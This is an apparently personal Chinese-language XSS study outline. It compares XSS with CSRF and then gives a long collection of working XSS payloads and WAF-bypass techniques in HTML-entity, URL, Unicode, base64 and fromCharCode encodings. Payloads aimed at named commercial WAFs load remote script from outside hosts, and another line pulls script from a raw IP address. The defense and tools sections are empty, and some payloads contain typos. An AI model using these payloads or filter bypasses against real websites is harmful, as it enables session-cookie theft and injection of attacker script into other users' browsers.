## XSS漏洞

```
仅为大纲，其中具体内容需要自己搜集学习后填写
```



### 一、基本原理

csrf与xss的区别
如果小白事先在xx网的首页如果发现了一个XSS漏洞,则小白可能会这样做：
1,欺骗Iucy访问埋伏了XSS脚本(盗取cookie的脚本)的页面;
2,Iucy中招，小白盗取到到ucy的cookie ;
3,小白顺利登录到lucy的后台,小白自己修改lucy的相关信息;

CSRF是借用户的权限完成攻击,攻击者并没有拿到用户的权限,而XSS是直接盗取到了用户的权限,然后实施破坏。
如何确认一个web系统存在csrf漏洞
1，对目标网站增删改的地方进行标记,并观察其逻辑，判断请求是否可以被伪造
–比如修改管理员账号时 ，并不需要验证旧密码 ，导致请求容易被伪造 ;
–比如对于敏感信息的修改并没有使用安全的token验证，导致请求容易被伪造;
2.确认凭证的有效期(这个问题会提高CSRF被利用的概率)
—虽然退出或者关闭了浏览器,但cookie仍然有效，或者session并没有及时过期,导致CSRF攻击变的简单

### 二、分类

#### 1.反射型



#### 2.存储型



#### 3.dom型



### 三、发现

**1.搜索框**:用户在搜索框中输入关键词。Web应用将关键词作为参数并显示在搜索结果页面，如果没有正确过滤和转义用户输入，可能导致反射性Xss.

**2.错误信息**，当Web应用显示错误信息时，如里将用户输入的内容未经处理直接插入到错误信息中，可能致反射性XSS!

**3.URL参数**: Web应用可能使用URL参教来显示或过滤内容，如果应用未对这些参数进行造当的处理，可能导致反射性XSS

**4，表单提交**，用户提交表单时，Web应用可能将部分用户输入显示在响应页面上，如果没有正确处理这些输入，可能导致反射性XSS

**5，评论和留言板**，虽然评论和留言板功能更容易导致存储型XSS，但任某些情况下，如果未对预览功能进行适当的过滤和转义，可能导致反射性Xss。

**6。分页和排序:**，Web应用可能使用URL套数来控制分页和排序。如果未对这些参数进行适当的过滤



### 四、危害&利用



~~~
addEventListener("click", () => location.href = "https://mall.hongfa.com");

在用户单击页面的任何地方时触发，并将页面重定向到指定的链接
~~~



### 五、payload积累

#### 1.常用标签与属性

~~~
<script src="http://47.95.15.102/"></script>
大小写以及双写绕过
<Script>alert(111)</script>
<sc<script>ript>alert(111)</script>
"><script>alert(/xss/)</script>
基本payload
<Script>alert(document.cookie)</script>
<script>alert(/xss/)</script>  //弹框，最常用
<script>confirm(1)</script>  //弹出确认框
<script>prompt(111)</script>   //弹出输入框
" autofocus onfocus=alert(1) x="
绕过手法(alert)(111)   (confirm)(111)

autofocus onfocus=alert(1)
对应的payload

<img>标签：
<img src='x' onerror=alert(1)>
在这个示例中，<img>标签的src属性设置为一个无效的 URL，然后使用onerror事件来触发alert弹窗。
<img src=x onerror="alert(1)">
<img src=x onerror=eval("alert(1)")>
<img src=1 onmouseover="alert('xss');">
<img src=1 onmouseout="alert('xss');">
<img src=1 onclick="alert('xss');">

"/> <a href=javascript:alert(1)>hhh </a> x="
<a>标签：
<a href="javascript:alert(1)">test</a>
<a href="x" onfocus="alert('xss');" autofocus="">xss</a>
<a href="x" onclick=eval("alert('xss');")>xss</a>
<a href="x" onmouseover="alert('xss');">xss</a>
<a href="x" onmouseout="alert('xss');">xss</a>
<a href=javascript:alert(1)>Click me</a>

这个示例在<a>标签的href属性中使用了JavaScript代码来触发alert弹窗。

当JavaScript被过滤或禁用时
攻击者可能尝试使用不太常见的事件或技巧来触发XSS攻击。以下是一些不太常见的事件代替：
onmouseover事件：这个事件在鼠标悬停在元素上时触发，可以被用来触发弹窗或其他恶意操作。
<a href=# onmouseover="alert(1)">Hover</a>

onmousemove`事件：这个事件在鼠标在元素内移动时触发，同样可以用于触发弹窗。
<a href="#" onmousemove=alert('XSS Attack!');>Move mouse over me</a>

onload`事件：这个事件通常用于在页面加载完成后触发，但攻击者可能尝试在某些元素上使用它。
<img src="image.jpg" onload="alert('XSS Attack!');">

onfocus`事件：这个事件在元素获得焦点时触发，可以用于输入框等元素。
<input type="text" onfocus="alert('XSS Attack!');" />

onblur事件：这个事件在元素失去焦点时触发，也可以被用于输入框等元素。
<input type="text" onblur="alert(1);" />

 <inpulet>标签
<input type='text' value='<img src=x onerror=alert("XSS Attack!")>'
在这个示例中，我们将`<input>`标签的`value`属性设置为包含`<img>`标签的XSS payload，用户如果输入这个值，就会触发弹窗。

<div>标签
<div onmouseover=art("XSS Attack!")>Hover over me</div>
这个示例使用`<div>`标签的`onmouseover`事件来触发`alert`弹窗，当用户将鼠标悬停在`<div>`上时，弹窗会出现。
原代码：
<div onmouseover='alert(1)'>DIV</div>
经过url编码：
<div onmouseover%3d'alert%26lpar%3b1%26rpar%3b'>DIV<%2fdiv>

<textarea>标签
<textarea onfocus='alert("XSS Attack!")'></textarea>
在这个示例中，我们使用`<textarea>`标签的`onfocus`事件来触发`alert`弹窗，当用户点击文本区域时，弹窗会出现。

<p> 标签
<p onclick="alert('xss');">xss</p>
<p onmouseover="alert('xss');">xss</p>
<p onmouseout="alert('xss');">xss</p>
<p onmouseup="alert('xss');">xss</p>

<input> 标签
<input onclick="alert('xss');">
<input onfocus="alert('xss');">
<input onfocus="alert('xss');" autofocus="">
<input onmouseover="alert('xss');">
<input type="text" onkeydown="alert('xss');"></input>
<input type="text" onkeypress="alert('xss');"></input>
<input type="text" onkeydown="alert('xss');"></input>

 <details>标签
<details ontoggle="alert('xss');"></details>
<details ontoggle="alert('xss');" open=""></details>

 <form> 标签
<form method="x" action="x" onmouseover="alert('xss');"><input type=submit></form>
<form method="x" action="x" onmouseout="alert('xss');"><input type=submit></form>
<form method="x" action="x" onmouseup="alert('xss');"><input type=submit></form>

<select> 标签
<select onfocus="alert('xss');" autofocus></select>
<select onmouseover="alert('xss');"></select>
<select onclick=eval("alert('xss');")></select>

<iframe>标签
<iframe src="data:text/html,<script>alert(111)</script>"></iframe>
<iframe src="javascript:alert(1)">test</iframe>
<iframe onload="alert(document.cookie)"></iframe>
<iframe onload="alert('xss');"></iframe>
<iframe onload="base64,YWxlcnQoJ3hzcycpOw=="></iframe>
<iframe onmouseover="alert('xss');"></iframe>
<!--base64编码-->
<iframe src="data:text/html;base64,PHNjcmlwdD5hbGVydCgneHNzJyk8L3NjcmlwdD4=">
<iframe src="aaa" onmouseover=alert(1) /><iframe>
<iframe src="javasscript:prompt(111)"></iframe>
<iframe srcdoc="<img src=x onerror=alert(document.domain)>"></iframe><iframe srcdoc="<img src=x onerror-alert(1)>"></iframe>

<svg>标签
<svg onload=alert(1)>
<svg onload=javascript:alert(1)>
<svg onload="alert('xss');"></svg>

<body>标签
<body onload="alert(1)">

<object>标签
这个需要借助 data 伪协议和 base64 编码来实现绕过
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></object>

<button>标签
<p onmousedown="alert(1)">text</p>
<p onmouseup="alert(1)">text</p>
<button onclick=alert(1)>
<button onfocus="alert('xss');" autofocus="">xss</button>
<button onclick="alert('xss');">xss</button>
<button onmouseover="alert('xss');">xss</button>
<button onmouseout="alert('xss');">xss</button>
<button onmouseup="alert('xss');">xss</button>
<button onmousedown="alert('xss');"></button>

<audio> 标签
<audio src=1 onerror=alert(1)>
<audio><source src="x" onerror="alert('xss');"></audio>
<audio controls onfocus=eval("alert('xss');") autofocus=""></audio>
<audio controls onmouseover="alert('xss');"><source src="x"></audio>

<video>标签
<video src=x onerror=alert(1)>
<video><source onerror="alert('xss');"></video>
<video controls onmouseover="alert('xss');"></video>
<video controls onfocus="alert('xss');" autofocus=""></video>
<video controls onclick="alert('xss');"></video>
~~~





#### 2.事件



### 六、绕WAF

#### 编码绕过

浏览器对 XSS 代码的解析顺序为：**HTML解码 —— URL解码 —— JS解码(只支持UNICODE)**。

##### 0x01. html 实体编码

**当可控点为单个标签属性时，可以使用 html 实体编码。**

```
<a href="可控点">test</a>

<iframe src="可控点">test<iframe>
<img src=x onerror="可控点">
```

**Payload**

```
<a href="javascript:alert(1)">test</a>
```

**十进制**

```
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">test</a>
```

**十六进制**

```
<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">test</a>
```

**可以不带分号**

```
<a href="&#x6a&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3a&#x61&#x6c&#x65&#x72&#x74&#x28&#x31&#x29">test</a>
```

**可以填充0**

```
<a href="&#x006a&#x0061&#x0076&#x0061&#x0073&#x0063&#x0072&#x0069&#x0070&#x0074&#x003a&#x0061&#x006c&#x0065&#x0072&#x0074&#x0028&#x0031&#x0029">test</a>
```

##### 0x02. url 编码

**当注入点存在 href 或者 src 属性时，可以使用 url 编码。**

```
<a href="可控点">test</a>

<iframe src="可控点">test</iframe>
```

**Payload**

```
<a href="javascript:alert(1)">test</a>

<iframe src="javascript:alert(1)">test</iframe>
```

**注：url 解析过程中，不能对协议类型进行任何的编码操作，所以 javascript: 协议头需要保留。**

```
<a href="javascript:%61%6c%65%72%74%28%31%29">test</a>

<iframe src="javascript:%61%6c%65%72%74%28%31%29">test</iframe>
```

**可以二次编码**

```
<a href="javascript:%2561%256c%2565%2572%2574%2528%2531%2529">test</a>

<iframe src="javascript:%2561%256c%2565%2572%2574%2528%2531%2529">test</iframe>
```

##### 0x03. js 编码

**解析的时候字符或者字符串仅会被解码为字符串文本或者标识符名称，例如 js 解析器工作的时候将`\u0061\u006c\u0065\u0072\u0074`进行解码后为`alert`，而`alert`是一个有效的标识符名称，它是能被正常解析的。但是像圆括号、双引号、单引号等等这些字符就只能被当作普通的文本，从而导致无法执行。**

**由于 js 是最后进行解析的，所以如果混合编码，需要先使用 js 编码再进行 url 编码或者 html 实体编码。**

**js 编码策略：**

1. "\" 加上三个八进制数字，如果个数不够，前面补0，例如 "<" 编码为 "\074"
2. "\x" 加上两个十六进制数字，如果个数不够，前面补0，例如 "<" 编码为 "\x3c"
3. "\u" 加上四个十六进制数字，如果个数不够，前面补0，例如 "<" 编码为 "\u003c"
4. 对于一些控制字符，使用特殊的 C 类型的转义风格（例如 \n 和 \r）

```
<img src=x onerror="可控点">

<input onfocus=location="可控点" autofocus> 
```

**Payload**

```
<img src=x onerror="alert(1)">

<input onfocus=location="alert(1)" autofocus> 
```

**Unicode 编码**

```
<img src=x onerror="\u0061\u006c\u0065\u0072\u0074(1)">

<input onfocus=location="javascript:\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029" autofocus> 
```

**注：**

**Unicode 编码时，只能对有效的标识符进行编码，否则非标识符解码后不能解析执行。例如 javascript:alert(1) ，进行 Unicode 编码时，只能对 alert 和 "1" 进行编码，框号编码后会被当成文本字符，不能执行。****ascii 八进制和十六进制编码使用时需要 eval、setTimeout等函数传递变量，并且可以对整个传递参数进行编码。例如 eval("alert(1)")，可以对 "alert(1)" 整个进行八进制、十六进制或者 Unicode 编码(双引号不参与)。**

**八进制和十六进制**

setTimeout() 是属于 window 的方法，该方法用于在指定的毫秒数后调用函数或计算表达式。

语法：`setTimeout(要执行的代码, 等待的毫秒数)`

```
setTimeout(JavaScript 函数, 等待的毫秒数)
1.<svg/onload=setTimeout('\x61\x6C\x65\x72\x74\x28\x31\x29')>
2.<svg/onload=setTimeout('\141\154\145\162\164\050\061\051')>
3.<svg/onload=setTimeout('\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029')>
4.<script>eval("\x61\x6C\x65\x72\x74\x28\x31\x29")</script>
5.<script>eval("\141\154\145\162\164\050\061\051")</script>
6.<script>eval("\u0061\u006C\u0065\u0072\u0074\u0028\u0031\u0029")</script>
```

##### 0x04. 混合编码

```
<a href="可控点">test</a>
```

**Payload**

```
<a href="javascript:alert(1)">test</a>
```

**html 编码**

```
<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;">test</a>
```

**Unicode 编码**

```
<a href="javascript:\u0061\u006c\u0065\u0072\u0074(1)">test</a>
```

**注：Unicode 编码不能对括号使用**

**url 编码**

```
<a href="javascript:%61%6c%65%72%74%28%31%29">test</a>
```

**由于浏览器对 xss 代码的解析过程是：html解析 —— url解析 —— js解析，所以可以编码方式进行组合绕过。**

```
1. 原代码
<a href="javascript:alert(1)">test</a>
2. 对alert进行JS编码（unicode编码）
<a href="javascript:\u0061\u006c\u0065\u0072\u0074(1)">test</a>
3. 对href标签中的\u0061\u006c\u0065\u0072\u0074进行URL编码
<a href="javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)">test</a>
4. 对href标签中的javascript:%5c%75%30%30%36%31%5c%75%30%30%36%63%5c%75%30%30%36%35%5c%75%30%30%37%32%5c%75%30%30%37%34(1)进行HTML编码：
<a href="&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x31;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x36;&#x33;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x36;&#x25;&#x33;&#x35;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x32;&#x25;&#x35;&#x63;&#x25;&#x37;&#x35;&#x25;&#x33;&#x30;&#x25;&#x33;&#x30;&#x25;&#x33;&#x37;&#x25;&#x33;&#x34;&#x28;&#x31;&#x29;">test</a>
```

**注：href、src等加载url的属性可以使用三种混合编码，on事件可以使用html实体编码和js编码混合，但url编码在on事件中不会解析。**

##### 0x05. base64 编码

**base64 编码通常需要使用到 data 伪协议。**

**data 协议使用方法：`data:资源类型;编码,内容`**

base64编码内容为

```
<script>alert(/xss/)</script>
PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=
```

通常与 base64 编码配合 data 协议的标签有 **<object>、<a>、<iframe>**

```
1.<object> 标签
<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></object>
2.<a> 标签
<a href="data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=">test</a>   （新版浏览器不支持）
3.<iframe> 标签
<iframe src="data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></iframe>
4.<embed> 标签
<embed src="data:text/html;base64, PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4="></embed>
```

**atob 函数**

atob() 方法用于解码使用 base-64 编码的字符串。

语法：`window.atob(encodedStr)`(encodedStr: 必需，是一个通过 btoa() 方法编码的字符串)

```
1.<a href=javascript:eval(atob('YWxlcnQoMSk='))>test</a>
2.<a href=javascript:eval(window.atob('YWxlcnQoMSk='))>test</a>
3.<a href=javascript:eval(window['atob']('YWxlcnQoMSk='))>test</a>
4.<img src=x onmouseover="eval(window.atob('YWxlcnQoMSk='))">
5.<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
6.<iframe src="javascript:eval(window['atob']('YWxlcnQoMSk='))"></iframe>
```

##### 0x06. ascii 编码

ascii 编码一般配合`String.fromCharCode`使用。

```
alert(1)
十进制：97, 108, 101, 114, 116, 40, 49, 41
十六进制：0x61, 0x6C, 0x65, 0x72, 0x74, 0x28, 0x31, 0x29
```

**十进制**

```
<a href='javascript:eval(String.fromCharCode(97, 108, 101, 114, 116, 40, 49, 41))'>test</a>
```

**十六进制**

```
<a href='javascript:eval(String.fromCharCode(0x61, 0x6C, 0x65, 0x72, 0x74, 0x28, 0x31, 0x29))'>test</a>
```

#### 空格过滤绕过

<html><img**AA**src**AA**onerror**BB**=**BB**alert**CC**(1)**DD**</html>

A位置可填充 /，/123/，%09，%0A，%0C，%0D，%20 B位置可填充 %09，%0A，%0C，%0D，%20 C位置可填充 %0B，/**/，如果加了双引号，则可以填充 %09，%0A，%0C，%0D，%20 D位置可填充 %09，%0A，%0C，%0D，%20，//，>

### 语言特性

JS有一个特性是Function()(); 你没看错，大写的Function和小写的function其含义有所不同。

对于Function()来说，写在其第一个括号内的JS语句会被直接执行。比如说我们可以试试

```javascript
Function(alert(‘1’))();
```

为了防止360再拦，还是要做的周全一点，还有一个小技巧就是反引号其实可以用于代替括号使用，为了让效果更炸裂一点，我们把alert(1)换成alert(document.cookie)。所以我们最终可以构造这么一个语句

```javascript
';Function(atob`YWxlcnQoZG9jdW1lbnQuY29va2llKQ`)();//
```

#### 圆括号过滤绕过

##### 0x01. 反引号替换

```
<script>alert`1`</script>
```

##### 0x02. throw 绕过

```
<video src onerror="javascript:window.onerror=alert;throw 1">
<svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
```

#### 单引号过滤绕过

##### 0x01. 斜杠替换

```
<script>alert(/xss/)</script>
```

##### 0x02. 反引号替换

```
<script>alert(`xss`)</script>
```

#### alert 过滤绕过

##### 0x01. prompt 替换

```
<script>prompt(/xss/)</script>
```

##### 0x02. confirm 替换

```
<script>confirm(/xss/)</script>
```

##### 0x03. console.log 替换

```
<script>console.log(3)</script>
```

##### 0x04. document.write 替换

```
<script>document.write(1)</script>
```

##### 0x05. base64 绕过

```
<img src=x onerror="Function`a${atob`YWxlcnQoMSk=`}```">
<img src=x onerror="``.constructor.constructor`a${atob`YWxlcnQoMSk=`}```">
```

#### 关键词置空绕过

##### 0x01. 大小写绕过

```
<script>alert(/xss/)</script>
```

可以转换为

```
<ScRiPt>AlErT(/xss/)</sCrIpT>
```

##### 0x02. 嵌套绕过

嵌套<script>和</script>突破

```
<script>alert(/xss/)</script>
```

可以转换为

```
<sc<script>ript>alert(/xss/)</sc</script>ript>
```

#### 函数拼接

##### 0x01. eval

```
<img src="x" onerror="eval('al'+'ert(1)')">
```

##### 0x02. top

```
<img src="x" onerror="top['al'+'ert'](1)">
```

##### 0x03. window

```
<img src="x" onerror="window['al'+'ert'](1)">
```

##### 0x04. self

```
<img src="x" onerror="self[`al`+`ert`](1)">
```

##### 0x05. parent

```
<img src="x" onerror="parent[`al`+`ert`](1)">
```

##### 0x06. frames

```
<img src="x" onerror="frames[`al`+`ert`](1)">
```

##### 0x07. 常用函数

```
<img src="x" onerror="eval(alert(1))">
<img src="x" onerror="open(alert(1))">
<img src="x" onerror="document.write(alert(1))">
<img src="x" onerror="setTimeout(alert(1))">
<img src="x" onerror="setInterval(alert(1))">
<img src="x" onerror="Set.constructor(alert(1))">
<img src="x" onerror="Map.constructor(alert(1))">
<img src="x" onerror="Array.constructor(alert(1))">
<img src="x" onerror="WeakSet.constructor(alert(1))">
<img src="x" onerror="constructor.constructor(alert(1))">
<img src="x" onerror="[1].map(alert(1))">
<img src="x" onerror="[1].find(alert(1))">
<img src="x" onerror="[1].every(alert(1))">
<img src="x" onerror="[1].filter(alert(1))">
<img src="x" onerror="[1].forEach(alert(1))">
<img src="x" onerror="[1].findIndex(alert(1))">
```

#### 赋值拼接

```
<img src onerror=_=alert,_(1)>
<img src x=al y=ert onerror=top[x+y](1)>
<img src onerror=top[a='al',b='ev',b+a]('alert(1)')>
<img src onerror=['ale'+'rt'].map(top['ev'+'al'])[0]['valu'+'eOf']()(1)>
```

#### 火狐IE专属

```
<marquee onstart=alert(1)>
```

#### 拆分法

当 Web 应用程序对目标用户的输入长度进行了限制时，这时无法注入较长的xss攻击向量，但是特定情况下，这种限制可以通过拆分法注入的方式进行绕过。

```
<script>a='document.write("'</script>
<script>a=a+'<script src=ht'</script>
<script>a=a+'tp://test.com/xs'</script>
<script>a=a+'s.js></script>")'</script>
<script>eval(a)</script>
```

通过上面的拆分法可以拼凑出下面完整的攻击向量：

```
document.write("<script src = http://test.com/xss.js></script>")
```

#### 绕过常见 waf 拦截

##### 安全狗

```
http://www.safedog.cn/index/privateSolutionIndex.html?tab=2<video/src/onerror=top[`al`%2B`ert`](1);>
http://www.safedog.cn/index/privateSolutionIndex.html?tab=2<video/src/onerror=appendChild(createElement("script")).src="//z.cn">
```

##### D盾

```
http://www.d99net.net/News.asp?id=126<video/src/onloadstart=top[`al`%2B`ert`](1);>
http://www.d99net.net/News.asp?id=126<video/src/onloadstart=top[a='al',b='ev',b%2ba](appendChild(createElement(`script`)).src=`//z.cn`);>
```

##### 云锁+奇安信 waf

```
http://www.yunsuo.com.cn/ht/dynamic/20190903/259.html?id=1<video/src/onloadstart=top[`al`%2B`ert`](1);>
http://www.yunsuo.com.cn/ht/dynamic/20190903/259.html?id=1<video/src/onloadstart=top[a='al',b='ev',b%2ba](appendChild(createElement(`script`)).src=`//z.cn`);>
```

### 七、如何防护



### 八、工具

#### 1.xss平台

#### 2.扫描器等



### 九、实战积累经验
